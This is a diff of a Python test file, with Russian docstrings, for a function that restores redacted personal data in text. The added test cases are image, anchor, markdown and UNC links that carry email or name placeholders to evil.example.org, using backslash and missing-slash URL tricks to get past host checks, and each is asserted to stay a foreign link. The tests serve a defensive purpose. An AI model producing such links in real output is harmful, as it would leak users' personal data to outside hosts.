@@ -202,6 +202,43 @@ def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
 @pytest.mark.parametrize(
     "answer",
     [
+        r'<img src="\\evil.example.org/p?q=<EMAIL_1>">',
+        r'<a href="https:\\evil.example.org/?q=<EMAIL_1>">',
+        r"https://\evil.example.org/?q=<EMAIL_1>",
+        r"[x](https:/\evil.example.org/?q=<EMAIL_1>)",
+        r'<img src="/\evil.example.org/p?q=<EMAIL_1>">',
+        '<a href="ht\ntps:\t\\\\evil.example.org/?q=<EMAIL_1>">',
+        '<img src="http:evil.example.org/p?q=<EMAIL_1>">',
+        "https:evil.example.org/?q=<EMAIL_1>",
+        r"file:\\evil.example.org\share\<EMAIL_1>",
+        r"\\evil.example.org\share\<EMAIL_1>",
+        r"[x](https://host-1.domain-1.example/?next=\\evil.example.org/<EMAIL_1>)",
+    ],
+)
+def test_backslashes_and_missing_slashes_lead_a_link_to_a_foreign_host(settings, answer):
+    """Хэнд-офф, P1: браузер читает «\\» в адресе с особой схемой как «/» и пропускает любую череду косых после
+    схемы, даже пустую, — все эти адреса ведут на evil.example.org (WHATWG URL)."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (r"https:\\host-1.domain-1.example\wiki?u=<EMAIL_1>", r"https:\\srv-dc01.contoso.ru\wiki?u=ivanov@contoso.ru"),
+        (r'<a href="\\host-1.domain-1.example\s\<EMAIL_1>">', r'<a href="\\srv-dc01.contoso.ru\s\ivanov@contoso.ru">'),
+        (r'path = "C:\\Users\\<EMAIL_1>\\report.docx"', r'path = "C:\\Users\\ivanov@contoso.ru\\report.docx"'),
+    ],
+)
+def test_own_links_and_paths_with_backslashes_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш адрес с обратными косыми восстанавливается, а «\\\\» внутри пути
+    Windows в строке кода — не начало адреса."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
         "<img src=\"https://evil.example.org/p?q=\n<EMAIL_1>\">",
         "<img src=\"https://host-1.domain-1.example\t@evil.example.org/p?q=<EMAIL_1>\">",
         "<img src=\"https://host-1.domain-1.example\n@evil.example.org/p?q=<EMAIL_1>\">",
@@ -440,10 +477,13 @@ def test_letters_that_fold_to_ascii_are_not_label_letters(settings, answer):
         ("file:///C:/Users/<PERSON_1>/a.txt", "file:///C:/Users/Иван Петров/a.txt"),
         ("x = 1; //TODO:<PERSON_1>", "x = 1; //TODO:Иван Петров"),
         ("//TODO(<PERSON_1>): проверить", "//TODO(Иван Петров): проверить"),
+        (r"file:\\\C:\Users\<PERSON_1>\a.txt", r"file:\\\C:\Users\Иван Петров\a.txt"),
+        (r"\\fs01\home\<PERSON_1>", r"\\fs01\home\Иван Петров"),
     ],
 )
 def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer, restored):
-    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут."""
+    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут;
+    с обратными косыми (хэнд-офф, P1) — так же, и путь UNC к узлу без домена тоже."""
     assert restore(person_state(), answer, settings).text == restored
 
 
@@ -458,11 +498,13 @@ def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer
         "//evil%2Eexample%2Eorg/?q=<PERSON_1>",
         "//evil。example。org/?q=<PERSON_1>",
         "//TODO:x//evil/?q=<PERSON_1>",
+        r"\\1572395042\?q=<PERSON_1>",
+        r"\\fs01\?next=\\1572395042\<PERSON_1>",
     ],
 )
 def test_file_and_protocol_relative_links_to_a_host_stay_foreign(settings, answer):
     """Та же находка с другой стороны: хост у «file://», имя с точкой (и то, что браузер превратит в точку),
-    число вместо IPv4 и второй адрес оставляют ссылку чужой."""
+    число вместо IPv4 и второй адрес — в том числе за обратными косыми — оставляют ссылку чужой."""
     result = restore(person_state(), answer, settings)
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
